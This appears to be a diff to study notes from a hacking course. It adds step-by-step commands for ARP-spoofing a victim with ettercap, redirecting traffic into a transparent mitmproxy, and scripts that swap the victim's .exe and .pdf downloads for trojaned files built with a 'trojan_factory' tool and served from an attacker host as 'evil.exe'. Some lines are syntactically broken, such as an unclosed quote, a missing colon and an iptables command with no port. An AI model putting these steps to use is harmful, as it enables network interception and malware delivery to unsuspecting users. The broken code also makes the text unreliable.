@@ -401,7 +401,7 @@ import mitmproxy
 
 def request(flow):
    if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
-       print("Got interesting flow")
+       print(Got interesting flow")
        flow.response = mitmproxy.http.HTTPResponse.make(301,"",{"Location":"http://10.20.215.8/file.exe"})
 
 
@@ -422,4 +422,67 @@ v-72)
 
 17) python trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico  -z
   
+v-73)
 
+18) 
+
+import mitmproxy 
+
+def request(flow):
+    if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf")
+       print()
+
+
+19) ettercap -Tq -M arp:remote -i eth0 -S /10.20.215.1// /10.20.215.9//
+
+20) ./mitmdump -s /root/basic.py --transparent 
+
+21) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 
+
+v-74)
+
+22) 
+
+import mitmproxy 
+
+def request(flow):
+   
+   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
+       print("[+] Got interesting flow")
+
+        
+       subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
+       flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})   
+
+
+v-75)
+
+23) 
+
+import mitmproxy 
+import subprocess
+
+def request(flow):
+   
+   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
+       print("[+] Got interesting flow")
+
+       front_file = flow.request.pretty_url + "#"    
+       subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
+       flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})   
+
+24)
+
+import mitmproxy 
+import subprocess
+
+def request(flow):
+   
+   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
+       print("[+] Got interesting flow")
+
+       front_file = flow.request.pretty_url + "#"    
+       subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
+       flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})
+
+       
